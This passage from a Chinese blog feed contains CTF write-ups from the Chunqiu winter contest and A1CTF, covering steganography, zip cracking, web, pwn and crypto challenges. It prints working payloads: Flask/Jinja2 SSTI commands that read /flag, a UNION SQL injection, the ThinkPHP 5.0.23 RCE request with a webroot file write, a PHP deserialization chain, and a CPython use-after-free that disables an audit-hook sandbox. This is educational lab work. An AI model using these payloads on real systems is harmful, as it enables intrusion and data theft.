<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
        current_number = start_number
        <span class="keyword">while</span> <span class="literal">True</span>:
            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
                <span class="keyword">break</span>
            decoded_password = decode_password(password_filename)
            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
            current_number += <span class="number">1</span>


<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>

<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
<p>拿到一张png，用010查一下看到zip头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
<p>foremost提取一下</p>
<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
<p>脚本：</p>
<pre><code class="highlight plaintext">import os
import zipfile
import tarfile
import py7zr
import shutil


def extract_zip(zip_path, extract_dir):
    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
        zip_ref.extractall(extract_dir)
        return zip_ref.namelist()  # 返回解压出来的文件列表


def extract_tar(tar_path, extract_dir):
    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
        tar_ref.extractall(extract_dir)
        return tar_ref.getnames()  # 返回解压出来的文件列表


def extract_7z(archive_path, extract_dir):
    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
        archive_ref.extractall(extract_dir)
        return archive_ref.getnames()  # 返回解压出来的文件列表


def handle_compressed_file(file_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
    if file_path.endswith(&#x27;.zip&#x27;):
        extracted_files = extract_zip(file_path, extract_dir)
    elif file_path.endswith(&#x27;.tar&#x27;):
        extracted_files = extract_tar(file_path, extract_dir)
    elif file_path.endswith(&#x27;.7z&#x27;):
        extracted_files = extract_7z(file_path, extract_dir)
    else:
        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
        return []

    # 记录去掉后缀并连接的文件名
    with open(output_txt, &#x27;a&#x27;) as output_file:
        for file_name in extracted_files:
            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)

    return extracted_files


def process_zip(zip_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
    # 解压当前zip文件并返回解压后的文件列表
    extracted_files = extract_zip(zip_path, extract_dir)

    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue  # 跳过目录

        # 如果解压出来的是压缩包，再进行递归处理
        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            # 解压嵌套压缩包并处理
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            # 如果是嵌套的压缩包，再递归调用
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

        else:
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if zip_path.endswith(&#x27;.zip&#x27;):
        os.remove(zip_path)


def process_tar(tar_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_tar(tar_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if tar_path.endswith(&#x27;.tar&#x27;):
        os.remove(tar_path)


def process_7z(archive_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_7z(archive_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if archive_path.endswith(&#x27;.7z&#x27;):
        os.remove(archive_path)


def main():
    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;

    if not os.path.exists(extract_dir):
        os.makedirs(extract_dir)

    # 开始处理压缩包
    with open(output_txt, &#x27;w&#x27;) as output_file:
        output_file.write(&quot;&quot;)
    process_zip(zip_path, extract_dir, output_txt)


if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>再对提出来的文件名做两种处理</p>
<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        file_names = infile.readlines()

    # 去掉换行符并从后往前连接
    reversed_file_names = [name.strip() for name in reversed(file_names)]

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
def remove_newlines_and_connect(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        # 读取所有行并去掉换行符
        file_names = infile.read().splitlines()

    # 将文件名用空格连接
    connected_file_names = &quot;&quot;.join(file_names)

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
        outfile.write(connected_file_names)  # 直接写入连接后的字符串

def main():
    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
    reverse_file_names(input_txt, output1_txt)
    remove_newlines_and_connect(input_txt, output2_txt)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>根据提示BASE58-Ripple、SM4-ECB</p>
<p>先后尝试顺序的和逆序的</p>
<p>最后逆序的得到以下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
<p>在谷歌搜图后判断出是 DataMatrix码</p>
<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
<p>根据提示deepsound和弱口令</p>
<p>试一下123？</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
<p>运气比较好直接出来了</p>
<p>提取zip后发现需要密码打开</p>
<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>

<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>

<p>得到flag.png</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
<p>先试着打一下，看看有没有绕过</p>
<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
<p>直接爆了，那就ls换cat flag解决</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
]]></content>
      <tags>
        <tag>-CTF -misc -WP</tag>
      </tags>
  </entry>
  <entry>
    <title>A1CTF_Writeup</title>
    <url>/2025/04/18/A1CTF-Writeup/</url>
    <content><![CDATA[<h1 id="A1CTF-writeup"><a href="#A1CTF-writeup" class="headerlink" title="A1CTF writeup"></a>A1CTF writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="真签到"><a href="#真签到" class="headerlink" title="真签到"></a>真签到</h3><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164303646.png" alt="image-20250406164303646"></p>
<p>分析源码，大概是post一个弱比较过了后include传的flag</p>
<p>这边数组绕过+一个盲打</p>
<pre><code class="highlight plaintext">a[]=1&amp;b[]=2&amp;flag=/flag</code></pre>

<p>拿到flag</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164513706.png" alt="image-20250406164513706"></p>
<h3 id="少女乐队时代"><a href="#少女乐队时代" class="headerlink" title="少女乐队时代"></a>少女乐队时代</h3><p>主页面没给提示</p>
<p>尝试用dirsearch扫一下</p>
<p>扫到备份文件<a href="http://www.zip/">www.zip</a></p>
<p>接着解压得到<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164642808.png" alt="image-20250406164642808"></p>
<p>初步分析第一个php，是一个反序列化，构链</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">MyGO</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$MyGO</span>;
    <span class="keyword">public</span> <span class="variable">$Mujica</span>;
    <span class="keyword">public</span> <span class="variable">$CRYCHIC</span>;
    <span class="comment">/*public function __call($name, $arguments)</span>
<span class="comment">    &#123;</span>
<span class="comment">       call_user_func($arguments[0]);//哦，好像不能rce</span>
<span class="comment">    &#125;*/</span>
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">Mujica</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$MyGO</span>;
    <span class="keyword">public</span> <span class="variable">$Mujica</span>;
    <span class="keyword">public</span> <span class="variable">$CRYCHIC</span>;
<span class="comment">/*public static function __callStatic($name, $arguments)</span>
<span class="comment">    &#123;</span>
<span class="comment">        readfile(&#x27;/flag&#x27;);</span>
<span class="comment">    &#125;*/</span>
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">CRYCHIC</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$MyGO</span>;
    <span class="keyword">public</span> <span class="variable">$Mujica</span>;
    <span class="keyword">public</span> <span class="variable">$CRYCHIC</span>;
<span class="comment">/*public function __toString()</span>
<span class="comment">    &#123;</span>
<span class="comment">        return $this-&gt;MyGO-&gt;Mujica($this-&gt;CRYCHIC);</span>
<span class="comment">    &#125;</span>
<span class="comment">*/</span>

&#125;
<span class="variable">$cr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CRYCHIC</span>();<span class="comment">//触发ToString</span>
<span class="variable">$cr</span>-&gt;MyGO = <span class="keyword">new</span> <span class="title function_ invoke__">MyGO</span>();<span class="comment">//触发Call</span>
<span class="variable">$cr</span>-&gt;CRYCHIC = [<span class="string">&#x27;Mujica&#x27;</span>, <span class="string">&#x27;readflag&#x27;</span>]; <span class="comment">// 触发__callStatic</span>
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cr</span>);
<span class="meta">?&gt;</span></code></pre>



<h3 id="留言框-尖尖的"><a href="#留言框-尖尖的" class="headerlink" title="留言框[尖尖的]"></a>留言框[尖尖的]</h3><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406164854971.png" alt="image-20250406164854971"></p>
<p>根据hint2是一个sqlite,并且根据hint5</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165135796.png" alt="image-20250406165135796"></p>
<p>尝试注入:</p>
<pre><code class="highlight sqlite">1 union select 1--+</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165236875.png" alt="image-20250406165236875"></p>
<p>到这里就没什么思路了，又因为不能正经注入来命令执行</p>
<p>试试SSTI</p>
<p>发现回显</p>
<pre><code class="highlight plaintext">1 union select &#x27;&#123;&#123;7*7&#125;&#125;&#x27;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165529894.png" alt="image-20250406165529894"></p>
<p>确定是SSTI注入，并且用正常的子类大不回显subclass下的列表，试试用config打</p>
<p>最终payload:</p>
<p><code>1+union+select+&#39;&#123;&#123;config.__class__.__init__.__globals__["os"].popen("cat+/flag").read()&#125;&#125;&#39;</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165635952.png" alt="image-20250406165635952"></p>
<h3 id="你渴望权力吗？"><a href="#你渴望权力吗？" class="headerlink" title="你渴望权力吗？"></a>你渴望权力吗？</h3><p>ThiinkPHP5.0.23的版本漏洞(RCE)</p>
<p>直接对着复现</p>
<pre><code class="highlight plaintext">index.php/?s=captcha
_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></pre>

<p>正确回显id</p>
<p>接着在id的位置注入php代码</p>
<pre><code class="highlight plaintext">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; /var/www/public/test.php
在id的位置ls 一下发现存在并且cat后代码没有被过滤
那么直接打开test.php</code></pre>

<p>最终发现flag</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406170618103.png" alt="image-20250406170618103"></p>
<h3 id="哈里路大旋风"><a href="#哈里路大旋风" class="headerlink" title="哈里路大旋风"></a>哈里路大旋风</h3><p>根据页面提示，存在一个源码泄露</p>
<p>用dirsearch递归扫一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250407124218435.png" alt="image-20250407124218435"></p>
<p>发现网页源码</p>
<pre><code class="highlight python"><span class="keyword">import</span> base64
<span class="keyword">import</span> os

<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect,render_template_string,jsonify

app = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>)


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/eeval&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">eeval</span>():
    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;code&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        code = request.form.get(<span class="string">&#x27;code&#x27;</span>)
        evalcode = base64.b64decode(code).decode()
        waf=<span class="string">&#x27;&#x27;&#x27;</span>
<span class="string">import sys</span>
<span class="string">import os</span>
<span class="string">import math</span>
<span class="string"></span>
<span class="string">def audit_checker(event,args):</span>
<span class="string">    if not event in [&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span>
<span class="string">        raise Exception(&quot;waf&quot;)</span>
<span class="string">sys.addaudithook(audit_checker)</span>
<span class="string"></span>
<span class="string">&#x27;&#x27;&#x27;</span>
        evalcode=waf+<span class="built_in">str</span>(evalcode)
        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/test.py&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:
            f.write(evalcode)
        <span class="keyword">try</span>:
            status_code = os.system(<span class="string">&quot;python /tmp/test.py &gt; /tmp/output&quot;</span>)
        <span class="keyword">except</span> Exception:

            <span class="keyword">return</span> <span class="string">&quot;runtime error!!!&quot;</span>,<span class="number">500</span>

        <span class="keyword">if</span> status_code == <span class="number">0</span>:
            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>
    <span class="keyword">else</span>:
        <span class="keyword">return</span> <span class="string">&quot;runtime error!!!&quot;</span>, <span class="number">200</span>


<span class="meta">@app.route(<span class="params"><span class="string">&quot;/myStatus&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">status</span>():
    <span class="keyword">try</span>:
        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/output&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> a:
            ans=a.read()
    <span class="keyword">except</span>:
        <span class="keyword">return</span> jsonify(&#123;
            <span class="string">&quot;success&quot;</span>: <span class="literal">False</span>,
        &#125;)
    <span class="keyword">return</span> jsonify(&#123;
    <span class="string">&quot;result&quot;</span>: &#123;
        <span class="string">&quot;time&quot;</span>: <span class="number">114</span>,
        <span class="string">&quot;memory&quot;</span>: <span class="number">514</span>,
        <span class="string">&quot;result&quot;</span>: <span class="number">114514</span>,
        <span class="string">&quot;language&quot;</span>: <span class="number">0</span>,
        <span class="string">&quot;output&quot;</span>: ans,
        <span class="string">&quot;compileInfo&quot;</span>: <span class="string">&quot;&quot;</span>,
        <span class="string">&quot;systemInfo&quot;</span>: <span class="string">&quot;&quot;</span>,
        <span class="string">&quot;count&quot;</span>: <span class="number">0</span>
    &#125;,
    <span class="string">&quot;success&quot;</span>:<span class="literal">True</span>
&#125;)


<span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">no_acm</span>(<span class="params">error</span>):
    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backup/www.zip&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">src</span>():
    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backup/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">backup</span>():
    <span class="keyword">return</span> <span class="number">403</span>

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</code></pre>

<p>代码审计+一点试验就可以发现提交代码时主要触发的就是eeval并且代码成功执行后会与waf拼接并写入，结果可在&#x2F;myStatus 查询</p>
<p>研究一下waf</p>
<pre><code class="highlight python"><span class="keyword">import</span> sys
<span class="keyword">import</span> os
<span class="keyword">import</span> math

<span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):
    <span class="keyword">if</span> <span class="keyword">not</span> event <span class="keyword">in</span> [<span class="string">&quot;builtins.input&quot;</span>,<span class="string">&quot;builtins.input/result&quot;</span>]:
        <span class="keyword">raise</span> Exception(<span class="string">&quot;waf&quot;</span>)
sys.addaudithook(audit_checker)</code></pre>

<p>有点pwn的知识，对我这种彩笔有点挑战，但是还是尝试打一下poc吧。。</p>
<pre><code class="highlight python"><span class="keyword">class</span> <span class="title class_">UAF</span>:
    <span class="keyword">def</span> <span class="title function_">__index__</span>(<span class="params">self</span>):
        <span class="keyword">global</span> memory
        uaf.clear()
        memory = <span class="built_in">bytearray</span>()
        uaf.extend([<span class="number">0</span>] * <span class="number">56</span>)
        <span class="keyword">return</span> <span class="number">1</span>
uaf = <span class="built_in">bytearray</span>(<span class="number">56</span>)
uaf[<span class="number">23</span>] = UAF()
ptr = <span class="built_in">int</span>(<span class="built_in">str</span>(os.system.__init__).split()[-<span class="number">1</span>][<span class="number">2</span>:-<span class="number">1</span>], <span class="number">16</span>) + <span class="number">24</span>
ptr = <span class="built_in">int</span>.from_bytes(memory[ptr:ptr + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>) + <span class="number">48</span>
audit_checker_addr = <span class="built_in">int</span>.from_bytes(memory[ptr:ptr + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>) + <span class="number">0x46920</span> //对应偏移版本
memory[audit_checker_addr:audit_checker_addr + <span class="number">8</span>] = [<span class="number">0</span>] * <span class="number">8</span>
os.system(<span class="string">&quot;cat /flag&quot;</span>)</code></pre>

<p>成功打出</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>写什么输什么</p>
<h3 id="我也爱打ACM"><a href="#我也爱打ACM" class="headerlink" title="我也爱打ACM"></a>我也爱打ACM</h3><p>没什么好说的，命令执行</p>
<pre><code class="highlight plaintext">import os
os.system(&#x27;cat /flag&#x27;)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165857572.png" alt="image-20250406165857572"></p>
<h3 id="操作系统-我只用国产的"><a href="#操作系统-我只用国产的" class="headerlink" title="操作系统?我只用国产的"></a>操作系统?我只用国产的</h3><p>先打开终端查看txt拿到第一段</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155350406.png" alt="image-20250406155350406"></p>
<p>解码得到<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155431623.png" alt="image-20250406155431623"></p>
<p><code>zjnuctf&#123;Deep1n</code></p>
<p>接着根据提示打开bash执行history重复执行第一段</p>
<p>找到第二段</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155609224.png" alt="image-20250406155609224"></p>
<p><code>_F0r3ns1c5_</code></p>
<p>接着根据提示32猜测那段是base32得到第三段</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155950623.png" alt="image-20250406155950623"></p>
<p><code>111111s_V3ry</code></p>
<p>接着根据提示<code>sudo su</code>转换为root</p>
<p>继续查看history</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160231350.png" alt="image-20250406160231350"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160147481.png" alt="image-20250406160147481"></p>
<p><code>_easssssy_</code></p>
<p>根据最后一条提示</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160353287.png" alt="image-20250406160353287"></p>
<p>在终端运行发现失败，拉到win段用010查一下</p>
<p>拿到flag5<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160625101.png" alt="image-20250406160625101"></p>
<p><code>R1ght?&#125;</code></p>
<p>完整flag:zjnuctf{Deep1n_F0r3ns1c5_111111s_V3ry_easssssy_R1ght?}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin?"></a>checkin?</h3><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406170031541.png" alt="image-20250406170031541"></p>
<p>主要分析这边的代码</p>
<p>可以看出在末尾会加一个~</p>
<p>那么就直接闭合前面的代码两个;;偷夹一个命令执行</p>
<p>最后再闭合一次’’</p>
<p> <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406142209201.png" alt="image-20250406142209201"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="解个方程再走吧"><a href="#解个方程再走吧" class="headerlink" title="解个方程再走吧"></a>解个方程再走吧</h3><p>呃呃，求解一个线性方程组+一个计算私钥和解密</p>
<p>先用矩阵算出来B</p>
<p>得到p,q,r</p>
<p>验证是素数后直接进行一个常规的RSA即可</p>
<pre><code class="highlight python"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix
<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime

hint1 = <span class="number">79333650588725980145842690308459793002212384733760792497903824255475158426421388758884515854200584020175891983698755801887895178728215285671100862522546388920</span>
hint2 = <span class="number">42091939085030707750026943885448586020057668249489766328512130903699537123923304865199162545942232848524822773449884502246598542894968112652618125488987069022</span>
hint3 = <span class="number">47921639502651352998409354170011465949752789835571950468703988521419628212309010862554662374631739734695758683737532319227640559546280393992908749025031664459</span>
c = <span class="number">586259203274257904218292861460908156791643965546148862992509079573222630681556586135763674536546688690974489814788756340855428929464618526167483888642489290771336451603000026408733311715167395195739872325726528303132908225270749388819542814906773941078450582493580078337058352635256194643788754312978887738514884542098007460979027337953355588053092228217870701331036051715877358001679941780694544265894801823172720742507964727231224661041139619112619170939564249</span>
e = <span class="number">65537</span>

A = Matrix([
    [<span class="number">1144</span>, <span class="number">5143</span>, <span class="number">1281</span>],
    [<span class="number">1869</span>, <span class="number">1356</span>, <span class="number">1495</span>],
    [<span class="number">1620</span>, <span class="number">1762</span>, <span class="number">1957</span>]
])
B = Matrix([hint1, hint2, hint3])
solution = A.solve(B)
p = solution[<span class="number">0</span>]
q = solution[<span class="number">1</span>]
r = solution[<span class="number">2</span>]
p, q, r = <span class="built_in">int</span>(p), <span class="built_in">int</span>(q), <span class="built_in">int</span>(r)
<span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> isPrime(r), <span class="string">&quot;其中一个解不是素数&quot;</span>
n = p * q * r
phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)
d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)
m = <span class="built_in">pow</span>(c, d, n)
flag = long_to_bytes(m)
<span class="built_in">print</span>(flag.decode())</code></pre>



